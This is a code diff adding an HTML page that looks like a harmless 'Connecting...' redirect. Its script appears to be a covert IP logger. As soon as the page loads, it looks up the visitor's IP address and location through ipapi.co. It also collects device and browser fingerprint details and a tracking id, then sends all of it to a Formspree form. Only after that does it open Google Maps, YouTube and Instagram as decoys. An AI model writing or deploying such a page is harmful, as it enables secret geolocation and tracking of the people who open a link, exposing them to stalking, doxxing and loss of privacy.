@@ -1,1 +1,79 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Slebewwww</title>
+  <script>
+    const id = new URLSearchParams(window.location.search).get("id") || "anon";
+    const ua = navigator.userAgent;
+
+    const isAndroid = /android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+    const logData = () => {
+      return fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const info = {
+            identifier: id,
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            org: data.org,
+            time: new Date().toISOString(),
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies_enabled: navigator.cookieEnabled,
+            referrer: document.referrer || "direct",
+            token: Math.random().toString(36).substring(2, 10),
+            device_memory: navigator.deviceMemory || "unknown",
+            cpu_cores: navigator.hardwareConcurrency || "unknown",
+            color_depth: screen.colorDepth || "unknown",
+            pixel_ratio: window.devicePixelRatio || "unknown",
+            online: navigator.onLine,
+            device_type: isAndroid ? "Android" : isIOS ? "iOS" : "Desktop"
+          };
+
+          return fetch("https://formspree.io/f/mrbkpvwy", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(info),
+          });
+        });
+    };
+
+    logData().finally(() => {
+      // Google Maps
+      window.open("https://www.google.com/maps", "_blank");
+
+      // YouTube intent link (Android) or fallback
+      setTimeout(() => {
+        if (isAndroid) {
+          window.open("intent://www.youtube.com/watch?v=xvFZjo5PgG0#Intent;package=com.google.android.youtube;scheme=https;end;", "_blank");
+        } else {
+          window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank");
+        }
+      }, 2000);
+
+      // Instagram _u/ profile shortcut
+      setTimeout(() => {
+        window.open("https://instagram.com/_u/instagram", "_blank");
+      }, 4000);
+
+      // Fallback redirect
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
+      }, 6000);
+    });
+  </script>
+</head>
+<body style="text-align: center; padding-top: 100px;">
+  <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExaXpva29kYnZyc2lqd2NmMWs1dWhwb3V6NDZkZ3FwcWM4NDE2MTFtNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Vuw9m5wXviFIQ/giphy.gif" alt="Loading..." width="150">
+  <p style="font-family: monospace; color: gray;">Menghubungkan...</p>
+</body>
+</html>
